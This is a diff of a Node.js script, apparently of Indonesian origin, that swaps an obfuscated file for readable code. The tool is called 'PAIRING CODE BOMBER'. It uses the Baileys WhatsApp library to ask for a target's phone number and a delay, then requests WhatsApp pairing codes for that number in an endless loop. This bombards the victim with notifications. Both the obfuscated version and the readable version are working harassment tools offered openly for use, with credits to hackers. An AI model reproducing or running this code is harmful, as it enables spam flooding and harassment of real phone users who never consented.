@@ -1,1 +1,193 @@
-const _0x4c0931=_0xbe23;(function(_0x2a44ed,_0x278cab){const _0x167135=_0xbe23,_0x5bb44b=_0x2a44ed();while(!![]){try{const _0x15bddc=-parseInt(_0x167135(0x13e))/0x1+parseInt(_0x167135(0x168))/0x2*(-parseInt(_0x167135(0x150))/0x3)+-parseInt(_0x167135(0x154))/0x4+-parseInt(_0x167135(0x13f))/0x5*(parseInt(_0x167135(0x16e))/0x6)+-parseInt(_0x167135(0x157))/0x7*(parseInt(_0x167135(0x144))/0x8)+-parseInt(_0x167135(0x16a))/0x9+parseInt(_0x167135(0x148))/0xa*(parseInt(_0x167135(0x14f))/0xb);if(_0x15bddc===_0x278cab)break;else _0x5bb44b['push'](_0x5bb44b['shift']());}catch(_0x4766b3){_0x5bb44b['push'](_0x5bb44b['shift']());}}}(_0x3245,0x3041e),process[_0x4c0931(0x16b)]['write']('\x1bc'));const figlet=require('figlet');function _0x3245(){const _0x2af318=['428256XnyuIQ','stdout','question','chalk','681204wVIYYo','Slant','Update\x20','silent','connection','text','unwatchFile','Koneksi\x20ditutup,\x20mencoba\x20kembali...','badSession','events','watchFile','Masukan\x20Nomor\x20Target,\x20Awali\x20Dengan\x20Code\x20Negara:\x20','Terjadi\x20kesalahan:','open','requestPairingCode','cache','138045zrYzRD','10jWHrQM','createInterface','blue','connectionClosed','Error\x20generating\x20pairing\x20code:\x20','16GfDxQG','bind','output','creds.update','10oEjVfS','match','\x0a\x0a\x0a#\x20Thanks\x20To:\x0a-\x20Allah\x20Swt\x0a-\x20Lezz\x20DcodeR\x20(\x20Pengembang\x20Tools\x20Ini\x20)\x0a-\x20Reda\x20(\x20Seorang\x20Peretas\x20Yang\x20Ganteng,\x20baik,\x20Dan\x20Tidak\x20Sombong\x20)\x0a-\x20Trojan\x20TKT\x0a-\x20Om\x20Adji\x0a-\x20Matrixman\x20(\x20Seorang\x20Hacker\x20Yang\x20Selalu\x20Gagal\x20Di\x20Dunia\x20Percintaan,\x20Tetapi\x20Selalu\x20Berhasil\x20Di\x20Dunia\x20Peretasan\x20)\x0a-\x20Rusdi,\x20Andre,dan\x20Seluruh\x20Teman\x20Jom0knya\x20(\x20Sangat\x20Menghibur\x20)\x0a-\x20Primexuu\x0a-\x20Amir\x20(\x20Babu\x20Reda\x20&\x20Lezz\x20)\x0a\x0a#\x20Sosial\x20Media\x20Pengembang\x0a-\x20Tiktok:\x20https://tiktok.com/@lezzzdcoder\x0a-\x20Github:\x20https://github.com/LezzDcodeR\x0a\x0a\x0a\x0a','join','defaultMaxListeners','child','pino','11107041JOSHzs','15BDwqGf','restartRequired','authState','red','726544bbprvS','Berhasil\x20terhubung!','default','484176DVQPpH','timedOut','\x0a\x0a\x0a\x0a\x0a⠀⠀⠀⠀⠀⠀⣠⡞⠁⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠈⠹⣦⡀⠀⠀⠀⠀⠀⠀\x0a⠀⠀⠀⠀⢀⣼⠋⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣦⣀⠀⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀\x0a⠀⠀⠀⢀⡾⠁⠀⣠⡾⢁⣾⡿⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣆⠹⣦⠀⠀⢻⣆⠀⠀⠀⠀\x0a⠀⠀⢀⡾⠁⢀⢰⣿⠃⠾⢋⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⠀⢹⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡌⠻⠆⢿⣧⢀⠀⢻⣆⠀⠀⠀\x0a⠀⠀⣾⠁⢠⡆⢸⡟⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣦⡸⣿⠀⣆⠀⢿⡄⠀⠀\x0a⠀⢸⡇⠀⣽⡇⢸⣿⠟⢡⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠙⢿⣿⠀⣿⡀⠘⣿⠀⠀\x0a⡀⣿⠁⠀⣿⡇⠘⣡⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣦⡙⠀⣿⡇⠀⢻⡇⠀\x0a⢸⡟⠀⡄⢻⣧⣾⡿⢋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣴⣿⠉⡄⢸⣿⠀\x0a⢾⡇⢰⣧⠸⣿⡏⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠀⠓⢶⠶⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⠙⣿⡟⢰⡧⠀⣿⠀\x0a⣸⡇⠰⣿⡆⠹⣠⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣿⡏⠀⠠⢺⠢⠀⠀⣿⣷⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠸⠁⣾⡇⠀⣿⠀\x0a⣿⡇⠀⢻⣷⠀⣿⡿⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡅⠀⠀⢸⡄⠀⠀⣿⣿⣿⣿⣿⣿⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡆⣰⣿⠁⠀⣿⠀\x0a⢸⣧⠀⡈⢿⣷⣿⠃⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣇⠀⢀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣸⡀⢿⣧⣿⠃⡀⢸⣿⠀\x0a⠀⣿⡀⢷⣄⠹⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣿⣿⠀⣼⣿⣿⣿⣿⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢸⡟⢁⣴⠇⣼⡇⠀\x0a⠀⢸⡇⠘⣿⣷⡈⢰⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢰⣿⡧⠈⣴⣿⠏⢠⣿⠀⠀\x0a⠀⠀⢿⡄⠘⢿⣿⣦⣿⣯⠘⣆⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⡎⢸⣿⣣⣾⡿⠏⠀⣾⠇⠀⠀\x0a⠀⠀⠈⢷⡀⢦⣌⠛⠿⣿⡀⢿⣆⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢀⣿⡁⣼⡿⠟⣉⣴⠂⣼⠏⠀⠀⠀\x0a⠀⠀⠀⠈⢷⡈⠻⣿⣶⣤⡁⠸⣿⣆⠡⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣾⡟⠀⣡⣴⣾⡿⠁⣴⠏⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠈⢿⣄⠈⢙⠿⢿⣷⣼⣿⣦⠹⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢡⣾⣿⣶⣿⠿⢛⠉⢀⣾⠏⠀⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠹⣧⡀⠳⣦⣌⣉⣙⠛⠃⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠐⠛⠋⣉⣉⣤⡶⠁⣰⡿⠁\x0a\x0a','@whiskeysockets/baileys','store','@hapi/boom','Menunggu\x2010\x20detik\x20sebelum\x20mencoba\x20lagi...','connectionLost','Pairing\x20Code:\x20','statusCode','close','readline','connection.update','error','Ubuntu','replace','Masukan\x20Delay:\x20','31760ZEHIBP','log'];_0x3245=function(){return _0x2af318;};return _0x3245();}function _0xbe23(_0x2c6ec2,_0x5cd150){const _0x32455e=_0x3245();return _0xbe23=function(_0xbe2364,_0x43dd80){_0xbe2364=_0xbe2364-0x139;let _0x4fb5f5=_0x32455e[_0xbe2364];return _0x4fb5f5;},_0xbe23(_0x2c6ec2,_0x5cd150);}figlet[_0x4c0931(0x173)]('PAIRING\x20CODE\x20BOMBER',{'font':_0x4c0931(0x16f),'horizontalLayout':_0x4c0931(0x156),'verticalLayout':_0x4c0931(0x156)},(_0x391a99,_0x4f2637)=>{const _0x53fefb=_0x4c0931;if(_0x391a99){console[_0x53fefb(0x169)](_0x53fefb(0x13a),_0x391a99);return;}console[_0x53fefb(0x169)](_0x4f2637);});const {default:makeWASocket,useMultiFileAuthState,DisconnectReason,makeInMemoryStore}=require(_0x4c0931(0x15a)),fs=require('fs'),pino=require(_0x4c0931(0x14e)),chalk=require(_0x4c0931(0x16d)),readline=require(_0x4c0931(0x162)),{Boom}=require(_0x4c0931(0x15c)),EventEmitter=require(_0x4c0931(0x177));EventEmitter[_0x4c0931(0x14c)]=0x96;const question=_0x5b9231=>{const _0xf1b1c1=_0x4c0931,_0x29ecf5=readline[_0xf1b1c1(0x140)]({'input':process['stdin'],'output':process[_0xf1b1c1(0x16b)]});return new Promise(_0x231dc9=>{const _0x1026ab=_0xf1b1c1;_0x29ecf5[_0x1026ab(0x16c)](_0x5b9231,_0x57b4fa=>{const _0x3f5f31=_0x1026ab;_0x29ecf5[_0x3f5f31(0x161)](),_0x231dc9(_0x57b4fa);});});},store=makeInMemoryStore({'logger':pino()[_0x4c0931(0x14d)]({'level':_0x4c0931(0x171),'stream':_0x4c0931(0x15b)})});async function startBot(){const _0x7c9a7f=_0x4c0931,{state:_0x18caf7,saveCreds:_0x1a613e}=await useMultiFileAuthState(_0x7c9a7f(0x152)),_0x24e34e=makeWASocket({'logger':pino({'level':_0x7c9a7f(0x171)}),'printQRInTerminal':![],'auth':_0x18caf7,'connectTimeoutMs':0xea60,'defaultQueryTimeoutMs':0x0,'keepAliveIntervalMs':0x2710,'emitOwnEvents':!![],'fireInitQueries':!![],'generateHighQualityLinkPreview':!![],'syncFullHistory':!![],'markOnlineOnConnect':!![],'browser':[_0x7c9a7f(0x165),'Chrome','20.0.04']});await new Promise(_0x5cb993=>setTimeout(_0x5cb993,0xbb8));let _0x3ada8b=![],_0x512aeb=0x0;console[_0x7c9a7f(0x169)](chalk[_0x7c9a7f(0x153)](_0x7c9a7f(0x159))+chalk[_0x7c9a7f(0x141)](_0x7c9a7f(0x14a)));let _0x52b0cd=await question(_0x7c9a7f(0x139)),_0x438e73=await question(_0x7c9a7f(0x167));while(!_0x3ada8b){try{_0x52b0cd=_0x52b0cd[_0x7c9a7f(0x166)](/[^0-9]/g,'');let _0x51dbaa=await _0x24e34e[_0x7c9a7f(0x13c)](_0x52b0cd);_0x51dbaa=_0x51dbaa[_0x7c9a7f(0x149)](/.{1,4}/g)?.[_0x7c9a7f(0x14b)]('-')||_0x51dbaa,console['log'](_0x7c9a7f(0x15f)+_0x51dbaa),_0x512aeb++,await new Promise(_0x222e37=>{const _0x308947=_0x7c9a7f,_0x39fc5b=setTimeout(()=>{!_0x3ada8b&&_0x222e37();},_0x438e73*0x3e8);_0x24e34e['ev']['on'](_0x308947(0x163),_0x19ecd2=>{const _0x537421=_0x308947;_0x19ecd2[_0x537421(0x172)]===_0x537421(0x13b)&&(_0x3ada8b=!![],clearTimeout(_0x39fc5b),console[_0x537421(0x169)](_0x537421(0x155)),_0x222e37());});});}catch(_0x5db1b4){console[_0x7c9a7f(0x169)](_0x7c9a7f(0x143)+_0x5db1b4),console[_0x7c9a7f(0x169)](_0x7c9a7f(0x15d)),await new Promise(_0x3f8e92=>setTimeout(_0x3f8e92,0x2710));}}store[_0x7c9a7f(0x145)](_0x24e34e['ev']),_0x24e34e['ev']['on'](_0x7c9a7f(0x163),async _0x5b2265=>{const _0x5811a3=_0x7c9a7f,{connection:_0x49bc3f,lastDisconnect:_0x56e375}=_0x5b2265;if(_0x49bc3f===_0x5811a3(0x161)){const _0xf833f8=new Boom(_0x56e375?.[_0x5811a3(0x164)])?.[_0x5811a3(0x146)]?.[_0x5811a3(0x160)];(_0xf833f8===DisconnectReason[_0x5811a3(0x176)]||_0xf833f8===DisconnectReason[_0x5811a3(0x142)]||_0xf833f8===DisconnectReason[_0x5811a3(0x15e)]||_0xf833f8===DisconnectReason['connectionReplaced']||_0xf833f8===DisconnectReason[_0x5811a3(0x151)]||_0xf833f8===DisconnectReason[_0x5811a3(0x158)])&&(console[_0x5811a3(0x169)](_0x5811a3(0x175)),startBot());}else{if(_0x49bc3f==='open'){}}}),_0x24e34e['ev']['on'](_0x7c9a7f(0x147),_0x1a613e);}startBot();const file=require['resolve'](__filename);fs[_0x4c0931(0x178)](file,()=>{const _0x3c8218=_0x4c0931;fs[_0x3c8218(0x174)](file),console[_0x3c8218(0x169)](_0x3c8218(0x170)+__filename),delete require[_0x3c8218(0x13d)][file],require(file);})
+process.stdout.write("c");
+const figlet = require('figlet');
+figlet.text("PAIRING CODE BOMBER", {
+  'font': "Slant",
+  'horizontalLayout': "default",
+  'verticalLayout': "default"
+}, (error, result) => {
+  if (error) {
+    console.log("Terjadi kesalahan:", error);
+    return;
+  }
+  console.log(result);
+});
+
+const {
+  default: makeWASocket,
+  useMultiFileAuthState,
+  DisconnectReason,
+  makeInMemoryStore
+} = require("@whiskeysockets/baileys");
+const fs = require('fs');
+const pino = require("pino");
+const chalk = require("chalk");
+const readline = require("readline");
+const { Boom } = require("@hapi/boom");
+const EventEmitter = require("events");
+EventEmitter.defaultMaxListeners = 150;
+
+const promptQuestion = questionText => {
+  const rlInterface = readline.createInterface({
+    'input': process.stdin,
+    'output': process.stdout
+  });
+  return new Promise(resolve => {
+    rlInterface.question(questionText, answer => {
+      rlInterface.close();
+      resolve(answer);
+    });
+  });
+};
+
+const store = makeInMemoryStore({
+  'logger': pino().child({
+    'level': "silent",
+    'stream': "store"
+  })
+});
+
+async function startBot() {
+  const {
+    state: authState,
+    saveCreds: saveCredentials
+  } = await useMultiFileAuthState("authState");
+  
+  const socket = makeWASocket({
+    'logger': pino({
+      'level': "silent"
+    }),
+    'printQRInTerminal': false,
+    'auth': authState,
+    'connectTimeoutMs': 60000,
+    'defaultQueryTimeoutMs': 0,
+    'keepAliveIntervalMs': 10000,
+    'emitOwnEvents': true,
+    'fireInitQueries': true,
+    'generateHighQualityLinkPreview': true,
+    'syncFullHistory': true,
+    'markOnlineOnConnect': true,
+    'browser': ["Ubuntu", 'Chrome', '20.0.04']
+  });
+
+  await new Promise(resolve => setTimeout(resolve, 3000));
+  
+  let isConnected = false;
+  let attemptCount = 0;
+
+  console.log(chalk.red(`
+                        
+                        
+                        
+                        
+                        ⠀⠀⠀⠀⠀⠀⣠⡞⠁⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠈⠹⣦⡀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⢀⣼⠋⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣦⣀⠀⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀
+      ⠀⠀⠀⢀⡾⠁⠀⣠⡾⢁⣾⡿⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣆⠹⣦⠀⠀⢻⣆⠀⠀⠀⠀
+        ⠀⠀⢀⡾⠁⢀⢰⣿⠃⠾⢋⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⠀⢹⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡌⠻⠆⢿⣧⢀⠀⢻⣆⠀⠀⠀
+          ⠀⠀⣾⠁⢠⡆⢸⡟⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣦⡸⣿⠀⣆⠀⢿⡄⠀⠀
+            ⠀⢸⡇⠀⣽⡇⢸⣿⠟⢡⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠙⢿⣿⠀⣿⡀⠘⣿⠀⠀
+              ⡀⣿⠁⠀⣿⡇⠘⣡⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣦⡙⠀⣿⡇⠀⢻⡇⠀
+                ⢸⡟⠀⡄⢻⣧⣾⡿⢋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣴⣿⠉⡄⢸⣿⠀
+                  ⢾⡇⢰⣧⠸⣿⡏⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠀⠓⢶⠶⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⠙⣿⡟⢰⡧⠀⣿⠀
+                    ⣸⡇⠰⣿⡆⠹⣠⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣿⡏⠀⠠⢺⠢⠀⠀⣿⣷⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠸⠁⣾⡇⠀⣿⠀
+                      ⣿⡇⠀⢻⣷⠀⣿⡿⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡅⠀⠀⢸⡄⠀⠀⣿⣿⣿⣿⣿⣿⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡆⣰⣿⠁⠀⣿⠀
+                        ⢸⣧⠀⡈⢿⣷⣿⠃⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣇⠀⢀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣸⡀⢿⣧⣿⠃⡀⢸⣿⠀
+                          ⠀⣿⡀⢷⣄⠹⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣿⣿⠀⣼⣿⣿⣿⣿⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢸⡟⢁⣴⠇⣼⡇⠀
+                            ⠀⢸⡇⠘⣿⣷⡈⢰⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢰⣿⡧⠈⣴⣿⠏⢠⣿⠀⠀
+                              ⠀⠀⢿⡄⠘⢿⣿⣦⣿⣯⠘⣆⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⡎⢸⣿⣣⣾⡿⠏⠀⣾⠇⠀⠀
+                                ⠀⠀⠈⢷⡀⢦⣌⠛⠿⣿⡀⢿⣆⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢀⣿⡁⣼⡿⠟⣉⣴⠂⣼⠏⠀⠀⠀
+                                  ⠀⠀⠀⠈⢷⡈⠻⣿⣶⣤⡁⠸⣿⣆⠡⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣾⡟⠀⣡⣴⣾⡿⠁⣴⠏⠀⠀⠀⠀
+                                    ⠀⠀⠀⠀⠈⢿⣄⠈⢙⠿⢿⣷⣼⣿⣦⠹⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢡⣾⣿⣶⣿⠿⢛⠉⢀⣾⠏⠀⠀⠀⠀⠀
+                                      ⠀⠀⠀⠀⠀⠀⠹⣧⡀⠳⣦⣌⣉⣙⠛⠃⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠐⠛⠋⣉⣉⣤⡶⠁⣰⡿⠁
+                                        
+  ") + chalk.blue("
+    
+  
+  # Thanks To:
+  - Allah Swt
+  - Lezz DcodeR ( Pengembang Tools Ini )
+  - Reda ( Seorang Peretas Yang Ganteng, baik, Dan Tidak Sombong )
+  - Trojan TKT
+  - Om Adji
+  - Matrixman ( Seorang Hacker Yang Selalu Gagal Di Dunia Percintaan, Tetapi Selalu Berhasil Di Dunia Peretasan )
+  - Rusdi, Andre,dan Seluruh Teman Jom0knya ( Sangat Menghibur )
+  - Primexuu
+  - Amir ( Babu Reda & Lezz )
+    
+  # Sosial Media Pengembang
+  - Tiktok: https://tiktok.com/@lezzzdcoder
+  - Github: https://github.com/LezzDcodeR
+  
+  
+  
+  `));
+
+  let targetNumber = await promptQuestion("Masukan Nomor Target, Awali Dengan Code Negara: ");
+  let delayTime = await promptQuestion("Masukan Delay: ");
+
+  while (!isConnected) {
+    try {
+      targetNumber = targetNumber.replace(/[^0-9]/g, '');
+      let pairingCode = await socket.requestPairingCode(targetNumber);
+      pairingCode = pairingCode.match(/.{1,4}/g)?.["join"]('-') || pairingCode;
+      console.log("Pairing Code: " + pairingCode);
+      attemptCount++;
+      
+      await new Promise(resolve => {
+        const timeoutId = setTimeout(() => {
+          if (!isConnected) {
+            resolve();
+          }
+        }, delayTime * 1000);
+
+        socket.ev.on("connection.update", update => {
+          if (update.connection === "open") {
+            isConnected = true;
+            clearTimeout(timeoutId);
+            console.log("Berhasil terhubung!");
+            resolve();
+          }
+        });
+      });
+    } catch (error) {
+      console.log("Error generating pairing code: " + error);
+      console.log("Menunggu 10 detik sebelum mencoba lagi...");
+      await new Promise(resolve => setTimeout(resolve, 10000));
+    }
+  }
+
+  store.bind(socket.ev);
+  
+  socket.ev.on("connection.update", async update => {
+    const {
+      connection: status,
+      lastDisconnect: disconnect
+    } = update;
+    
+    if (status === "close") {
+      const statusCode = new Boom(disconnect?.["error"])?.["output"]?.["statusCode"];
+      if (statusCode === DisconnectReason.badSession || 
+          statusCode === DisconnectReason.connectionClosed || 
+          statusCode === DisconnectReason.connectionLost || 
+          statusCode === DisconnectReason.connectionReplaced || 
+          statusCode === DisconnectReason.restartRequired || 
+          statusCode === DisconnectReason.timedOut) {
+        console.log("Koneksi ditutup, mencoba kembali...");
+        startBot();
+      }
+    } else if (status === 'open') {
+      // Connection is open
+    }
+  });
+
+  socket.ev.on("creds.update", saveCredentials);
+}
+
+startBot();
+
+const file = require.resolve(__filename);
+fs.watchFile(file, () => {
+  fs.unwatchFile(file);
+  console.log("Update " + __filename);
+  delete require.cache[file];
+  require(file);
+});
